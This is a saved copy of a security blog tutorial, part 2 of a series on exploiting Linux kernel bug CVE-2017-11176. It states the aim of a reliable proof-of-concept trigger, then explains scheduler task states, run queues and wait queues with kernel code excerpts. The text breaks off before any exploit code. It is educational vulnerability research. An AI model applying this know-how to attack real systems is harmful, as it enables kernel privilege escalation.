<!DOCTYPE html>
<!-- saved from url=(0073)https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html -->
<html lang="en" class="fontawesome-i2svg-active fontawesome-i2svg-complete"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Lexfo's security blog - CVE-2017-11176: A step-by-step Linux Kernel exploitation (part 2/4)</title><meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport"><style type="text/css">svg:not(:root).svg-inline--fa{overflow:visible}.svg-inline--fa{display:inline-block;font-size:inherit;height:1em;overflow:visible;vertical-align:-.125em}.svg-inline--fa.fa-lg{vertical-align:-.225em}.svg-inline--fa.fa-w-1{width:.0625em}.svg-inline--fa.fa-w-2{width:.125em}.svg-inline--fa.fa-w-3{width:.1875em}.svg-inline--fa.fa-w-4{width:.25em}.svg-inline--fa.fa-w-5{width:.3125em}.svg-inline--fa.fa-w-6{width:.375em}.svg-inline--fa.fa-w-7{width:.4375em}.svg-inline--fa.fa-w-8{width:.5em}.svg-inline--fa.fa-w-9{width:.5625em}.svg-inline--fa.fa-w-10{width:.625em}.svg-inline--fa.fa-w-11{width:.6875em}.svg-inline--fa.fa-w-12{width:.75em}.svg-inline--fa.fa-w-13{width:.8125em}.svg-inline--fa.fa-w-14{width:.875em}.svg-inline--fa.fa-w-15{width:.9375em}.svg-inline--fa.fa-w-16{width:1em}.svg-inline--fa.fa-w-17{width:1.0625em}.svg-inline--fa.fa-w-18{width:1.125em}.svg-inline--fa.fa-w-19{width:1.1875em}.svg-inline--fa.fa-w-20{width:1.25em}.svg-inline--fa.fa-pull-left{margin-right:.3em;width:auto}.svg-inline--fa.fa-pull-right{margin-left:.3em;width:auto}.svg-inline--fa.fa-border{height:1.5em}.svg-inline--fa.fa-li{width:2em}.svg-inline--fa.fa-fw{width:1.25em}.fa-layers svg.svg-inline--fa{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.fa-layers{display:inline-block;height:1em;position:relative;text-align:center;vertical-align:-.125em;width:1em}.fa-layers svg.svg-inline--fa{-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter,.fa-layers-text{display:inline-block;position:absolute;text-align:center}.fa-layers-text{left:50%;top:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter{background-color:#ff253a;border-radius:1em;-webkit-box-sizing:border-box;box-sizing:border-box;color:#fff;height:1.5em;line-height:1;max-width:5em;min-width:1.5em;overflow:hidden;padding:.25em;right:0;text-overflow:ellipsis;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-bottom-right{bottom:0;right:0;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom right;transform-origin:bottom right}.fa-layers-bottom-left{bottom:0;left:0;right:auto;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom left;transform-origin:bottom left}.fa-layers-top-right{right:0;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-top-left{left:0;right:auto;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top left;transform-origin:top left}.fa-lg{font-size:1.33333em;line-height:.75em;vertical-align:-.0667em}.fa-xs{font-size:.75em}.fa-sm{font-size:.875em}.fa-1x{font-size:1em}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-6x{font-size:6em}.fa-7x{font-size:7em}.fa-8x{font-size:8em}.fa-9x{font-size:9em}.fa-10x{font-size:10em}.fa-fw{text-align:center;width:1.25em}.fa-ul{list-style-type:none;margin-left:2.5em;padding-left:0}.fa-ul>li{position:relative}.fa-li{left:-2em;position:absolute;text-align:center;width:2em;line-height:inherit}.fa-border{border:solid .08em #eee;border-radius:.1em;padding:.2em .25em .15em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left,.fab.fa-pull-left,.fal.fa-pull-left,.far.fa-pull-left,.fas.fa-pull-left{margin-right:.3em}.fa.fa-pull-right,.fab.fa-pull-right,.fal.fa-pull-right,.far.fa-pull-right,.fas.fa-pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.fa-rotate-90{-webkit-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-webkit-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-webkit-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-webkit-transform:scale(-1,1);transform:scale(-1,1)}.fa-flip-vertical{-webkit-transform:scale(1,-1);transform:scale(1,-1)}.fa-flip-horizontal.fa-flip-vertical{-webkit-transform:scale(-1,-1);transform:scale(-1,-1)}:root .fa-flip-horizontal,:root .fa-flip-vertical,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-rotate-90{-webkit-filter:none;filter:none}.fa-stack{display:inline-block;height:2em;position:relative;width:2em}.fa-stack-1x,.fa-stack-2x{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.svg-inline--fa.fa-stack-1x{height:1em;width:1em}.svg-inline--fa.fa-stack-2x{height:2em;width:2em}.fa-inverse{color:#fff}.sr-only{border:0;clip:rect(0,0,0,0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.sr-only-focusable:active,.sr-only-focusable:focus{clip:auto;height:auto;margin:0;overflow:visible;position:static;width:auto}</style><link href="https://blog.lexfo.fr/feeds/all.atom.xml" rel="alternate" title="Lexfo&#39;s security blog Full Atom Feed" type="application/atom+xml"><link href="https://blog.lexfo.fr/feeds/all.rss.xml" rel="alternate" title="Lexfo&#39;s security blog Full RSS Feed" type="application/rss+xml"><link href="https://blog.lexfo.fr/feeds/%7Bslug%7D.atom.xml" rel="alternate" title="Lexfo&#39;s security blog Categories Atom Feed" type="application/atom+xml"><link href="https://blog.lexfo.fr/feeds/%7Bslug%7D.rss.xml" rel="alternate" title="Lexfo&#39;s security blog Categories RSS Feed" type="application/rss+xml"><link href="https://blog.lexfo.fr/theme/images/favicon.ico" rel="icon" type="image/x-icon"><link href="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 2_files/packed.css" rel="stylesheet" type="text/css"></head><body><header class="blog-header py-3 text-center" id="logo"><h1><a href="https://blog.lexfo.fr/"><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 2_files/lexfo.png" title="Lexfo&#39;s security blog"></a></h1></header><nav class="navbar navbar-expand-md navbar-dark mb-4" style="background-color: rgb(179,32,39);"><div class="container"><button aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler" data-target="#navbarSupportedContent" data-toggle="collapse" type="button"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav position-absolute-left"><li class="nav-item"><a class="nav-link text-light" href="https://lexfo.fr/">Back to the main site</a></li></ul><ul class="navbar-nav ml-auto mr-auto"><li class="nav-item"><a class="nav-link text-light" href="https://blog.lexfo.fr/">Home</a></li><li class="nav-item"><a class="nav-link text-light" href="https://blog.lexfo.fr/categories.html">Categories</a></li><li class="nav-item"><a class="nav-link text-light" href="https://blog.lexfo.fr/tags.html">Tags</a></li><li class="nav-item"><a class="nav-link text-light" href="https://blog.lexfo.fr/archives.html">Archives</a></li></ul></div></div></nav><main class="container" role="main"><div class="row"><article class="col-10 offset-1 blog-main"><div class="p-3 blog-post rounded"><h1 class="blog-post-title mb-1">CVE-2017-11176: A step-by-step Linux Kernel exploitation (part 2/4)</h1><div class="blog-post-meta mb-4"><p><span class="mr-3"><strong>Tue 02 October 2018</strong> by <strong>Nicolas FABRETTI</strong> in <strong><a href="https://blog.lexfo.fr/category/vulnerability.html">Vulnerability</a>.</strong></span></p><p><span><a "="" class="mr-2" href="https://blog.lexfo.fr/tag/linux.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Linux</a> <a "="" class="mr-2" href="https://blog.lexfo.fr/tag/exploit.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Exploit</a> <a "="" class="mr-2" href="https://blog.lexfo.fr/tag/vulnerability.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Vulnerability</a> <a "="" class="mr-2" href="https://blog.lexfo.fr/tag/kernel.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Kernel</a> <a "="" class="mr-2" href="https://blog.lexfo.fr/tag/step-by-step.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Step-by-step</a></span></p><div class="share" id="post-share-links"><div class="share-twitter"><a href="https://twitter.com/intent/tweet?text=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%202/4%29&amp;url=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-twitter fa-w-16" data-prefix="fab" data-icon="twitter" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg><!-- <i aria-hidden="true" class="fab fa-twitter"></i> -->Tweet</span></a></div><div class="share-facebook"><a href="http://www.facebook.com/sharer/sharer.php?u=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-facebook fa-w-14" data-prefix="fab" data-icon="facebook" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M448 56.7v398.5c0 13.7-11.1 24.7-24.7 24.7H309.1V306.5h58.2l8.7-67.6h-67v-43.2c0-19.6 5.4-32.9 33.5-32.9h35.8v-60.5c-6.2-.8-27.4-2.7-52.2-2.7-51.6 0-87 31.5-87 89.4v49.9h-58.4v67.6h58.4V480H24.7C11.1 480 0 468.9 0 455.3V56.7C0 43.1 11.1 32 24.7 32h398.5c13.7 0 24.8 11.1 24.8 24.7z"></path></svg><!-- <i aria-hidden="true" class="fab fa-facebook"></i> -->Share</span></a></div><div class="share-linkedin"><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html&amp;title=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%202/4%29&amp;summary=In%20the%20second%20article%2C%20a%20ring-3%20PoC%20is%20built%20by%20removing%20each%20SystemTap%20script%20line%20one-by-one.%20It%20explains%20how%20to%20find%20and%20tailor%20syscalls%20to%20force%20the%20kernel%20into%20particular%20code%20paths%20as%20well%20as%20unconditionally%20win%20the%20race%20condition.%20The%20core%20concept%20section%20focuses%20on%20the%20scheduler%20subsystem%20%28task%20states%20and%20wait%20queues%29.&amp;source=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-linkedin fa-w-14" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg><!-- <i aria-hidden="true" class="fab fa-linkedin"></i> -->Share</span></a></div><div class="share-email"><a href="mailto:?subject=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%202/4%29&amp;body=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-envelope fa-w-16" data-prefix="far" data-icon="envelope" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"></path></svg><!-- <i aria-hidden="true" class="far fa-envelope"></i> -->Share</span></a></div></div></div><div class="blog-post-content"><h1 id="introduction">Introduction</h1><p>The <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">previous article</a> provided a detailed analysis of the CVE-2017-11176 bug (aka. "mq_notify: double sock_put()") as well as an attack scenario.</p><p>We "forced" the trigger from kernel-land to validate the bug (with the help of System Tap), and built the first version of the exploit (which only reaches the vulnerable code).</p><p>It exposed three requirements needed to trigger the bug (and how to satisfy them):</p><ol><li>Force netlink_attachskb() to return 1</li><li>Unblock the exploit thread</li><li>Force the second fget() call to return NULL</li></ol><p>In this article, we will try to get rid of the System Tap script and satisfy those requirements using userland code only. By the end of the article, we will have a complete proof-of-concept code that triggers the bug reliably.</p><hr><h1 id="table-of-contents">Table of Contents</h1><ul><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html#core-concepts-2">Core Concepts #2</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html#unblocking-the-main-thread">Unblocking the Main Thread</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html#making-fget-fail-on-second-loop">Making <em>fget()</em> Fail on Second Loop</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html#looping-back-to-retry-label">Looping back to "retry" label</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html#final-proof-of-concept-code">Final Proof-Of-Concept Code</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html#conclusion">Conclusion</a></li></ul><hr><h1 id="core-concepts-2">Core Concepts #2</h1><p>In this second "core concepts" section, the scheduler subsystem will be introduced. The first focus will be on task states and how a task transitions between various states. Note that the actual scheduler algorithm (<a href="https://www.linuxjournal.com/node/10267">Completely Fair Scheduler</a>) will not be discussed here.</p><p>It emphasizes the <strong>wait queues</strong> as they will be used in this article to unblock a thread, and during the exploit to gain an arbitrary call primitive (cf. part 3).</p><h2 id="task-state">Task State</h2><p>The <em>running</em> state of a task is stored in the <strong>state</strong> field of a task_struct. A task is basically in one of those states (there are more):</p><ul><li><strong>Running</strong>: the process is either running or waiting to be run on a cpu</li><li><strong>Waiting</strong>: the process is waiting/sleeping for an event/resource.</li></ul><p>A "running" task (<em>TASK_RUNNING</em>) is a task that belongs to a <strong>run queue</strong>. It can either be running on a cpu (right now) or in a near future (if elected by the scheduler).</p><p>A "waiting" task is not running on any CPU. It can be woken up with the help of <strong>wait queues</strong> or signals. The most common state for waiting tasks is <em>TASK_INTERRUPTIBLE</em> (i.e. "sleeping" can be interrupted).</p><p>The various task states are defined here:</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/linux/sched.h]</span>

<span class="cp">#define TASK_RUNNING        0</span>
<span class="cp">#define TASK_INTERRUPTIBLE  1</span>
<span class="c1">// ... cut (other states) ...</span>
</code></pre></div><p>The state field can be manipulated directly or through the <strong>__set_current_state()</strong> helper which uses the "current" macro:</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/linux/sched.h]</span>

<span class="cp">#define __set_current_state(state_value)            \</span>
<span class="cp">    do { current-&gt;state = (state_value); } while (0)</span>
</code></pre></div><h2 id="run-queues">Run Queues</h2><p>The <strong>struct rq</strong> (run queue) is one of the most important data structure for the scheduler. Every task that is in a run queue will be executed by a CPU. Every CPU has it own run queue (allowing true multi-tasking). It holds the list of tasks which are "electable" (by the scheduler) to run on a given CPU. It also has statistics used by the scheduler to make "fair" choices, and eventually rebalance the load between each cpu (i.e. cpu migration).</p><div class="highlight"><pre><span></span><code><span class="c1">// [kernel/sched.c]</span>

<span class="k">struct</span> <span class="nc">rq</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">nr_running</span><span class="p">;</span><span class="w">   </span><span class="c1">// &lt;----- statistics</span>
<span class="w">  </span><span class="n">u64</span><span class="w"> </span><span class="n">nr_switches</span><span class="p">;</span><span class="w">            </span><span class="c1">// &lt;----- statistics</span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">task_struct</span><span class="w"> </span><span class="o">*</span><span class="n">curr</span><span class="p">;</span><span class="w">   </span><span class="c1">// &lt;----- the current running task on the cpu</span>
<span class="w">  </span><span class="c1">// ...</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p><strong>NOTE</strong>: With the "Completely Fair Scheduler (CFS)", the way the actual task list is stored is a bit complex but it does not matter here.</p><p>To keep it simple, consider that a task moved out of any run queue will not be executed (i.e. there is no CPU to execute it). This is exactly what the <strong>deactivate_task()</strong> function does. On the contrary, <strong>activate_task()</strong> does the exact opposite (it moves task into a run queue).</p><h2 id="blocking-a-task-and-the-schedule-function">Blocking a task and the schedule() function</h2><p>When a task wants to transition from a running state to a waiting state it has to do at least two things:</p><ol><li>Set its own <em>running</em> state to TASK_INTERRUPTIBLE</li><li>Invoke deactivate_task() to move out of its run queue</li></ol><p>In practice, no one calls deactivate_task() directly. Instead, <strong>schedule()</strong> is invoked (see below).</p><p>The schedule() function is the main function of the scheduler. When schedule() is invoked, the next (running) task must be elected to run on the CPU. That is, the <strong>curr</strong> field of a run queue must be updated.</p><p>However, if schedule() is called while the current task state is not running (i.e. its state is different from zero), and no signals are pending, it will call deactivate_task():</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="n">asmlinkage</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="n">__sched</span><span class="w"> </span><span class="n">schedule</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">task_struct</span><span class="w"> </span><span class="o">*</span><span class="n">prev</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">next</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="n">switch_count</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">rq</span><span class="w"> </span><span class="o">*</span><span class="n">rq</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">cpu</span><span class="p">;</span><span class="w"></span>

<span class="w">          </span><span class="c1">// ... cut ...</span>

<span class="w">        </span><span class="n">prev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rq</span><span class="o">-&gt;</span><span class="n">curr</span><span class="p">;</span><span class="w">    </span><span class="c1">// &lt;---- "prev" is the task running on the current CPU</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">prev</span><span class="o">-&gt;</span><span class="n">state</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="p">(</span><span class="n">preempt_count</span><span class="p">()</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">PREEMPT_ACTIVE</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">   </span><span class="c1">// &lt;----- ignore the "preempt" stuff</span>
<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">signal_pending_state</span><span class="p">(</span><span class="n">prev</span><span class="o">-&gt;</span><span class="n">state</span><span class="p">,</span><span class="w"> </span><span class="n">prev</span><span class="p">)))</span><span class="w"></span>
<span class="w">            </span><span class="n">prev</span><span class="o">-&gt;</span><span class="n">state</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TASK_RUNNING</span><span class="p">;</span><span class="w"></span>
<span class="w">          </span><span class="k">else</span><span class="w"></span>
<span class="w">            </span><span class="n">deactivate_task</span><span class="p">(</span><span class="n">rq</span><span class="p">,</span><span class="w"> </span><span class="n">prev</span><span class="p">,</span><span class="w"> </span><span class="n">DEQUEUE_SLEEP</span><span class="p">);</span><span class="w">     </span><span class="c1">// &lt;----- task is moved out of run queue</span>
<span class="w">          </span><span class="n">switch_count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">prev</span><span class="o">-&gt;</span><span class="n">nvcsw</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>

<span class="w">        </span><span class="c1">// ... cut (choose the next task) ...</span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>In the end, a task can block by doing the following sequence:</p><div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">make_it_block</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="n">__set_current_state</span><span class="p">(</span><span class="n">TASK_INTERRUPTIBLE</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">schedule</span><span class="p">();</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>The task will stay blocked until <em>something else</em> wakes it up.</p><h2 id="wait-queues">Wait Queues</h2><p>Waiting for a resource or a special event is very common. For instance, if you run a server, the main thread might be waiting for incoming connections. Unless it is marked as "non blocking", the accept() syscall will block the main thread. That is, the main thread is stuck in kernel land until <em>something else</em> wakes it up.</p><p>A <strong>wait queue</strong> is basically a doubly linked list of processes that are currently blocked (<em>waiting</em>). One might see it as the "opposite" of run queues. The queue itself is represented with <strong>wait_queue_head_t</strong>:</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/linux/wait.h]</span>

<span class="k">typedef</span><span class="w"> </span><span class="k">struct</span> <span class="nc">__wait_queue_head</span><span class="w"> </span><span class="n">wait_queue_head_t</span><span class="p">;</span><span class="w"></span>

<span class="k">struct</span> <span class="nc">__wait_queue_head</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">spinlock_t</span><span class="w"> </span><span class="n">lock</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="n">task_list</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p><strong>NOTE</strong>: The <strong>struct list_head</strong> type is how Linux implements doubly linked list.</p><p>Each element of the wait queue has the type <strong>wait_queue_t</strong>:</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/linux.wait.h]</span>

<span class="k">typedef</span><span class="w"> </span><span class="k">struct</span> <span class="nc">__wait_queue</span><span class="w"> </span><span class="n">wait_queue_t</span><span class="p">;</span><span class="w"></span>
<span class="k">typedef</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">wait_queue_func_t</span><span class="p">)(</span><span class="n">wait_queue_t</span><span class="w"> </span><span class="o">*</span><span class="n">wait</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="n">mode</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">flags</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">);</span><span class="w"></span>

<span class="k">struct</span> <span class="nc">__wait_queue</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">flags</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">private</span><span class="p">;</span><span class="w">                </span>
<span class="w">    </span><span class="n">wait_queue_func_t</span><span class="w"> </span><span class="n">func</span><span class="p">;</span><span class="w">     </span><span class="c1">// &lt;----- we will get back to this</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="n">task_list</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>A wait queue element can be created with the <strong>DECLARE_WAITQUEUE()</strong> macro...</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/linux/wait.h]</span>

<span class="cp">#define __WAITQUEUE_INITIALIZER(name, tsk) {                \</span>
<span class="cp">    .private    = tsk,                      \</span>
<span class="cp">    .func       = default_wake_function,            \</span>
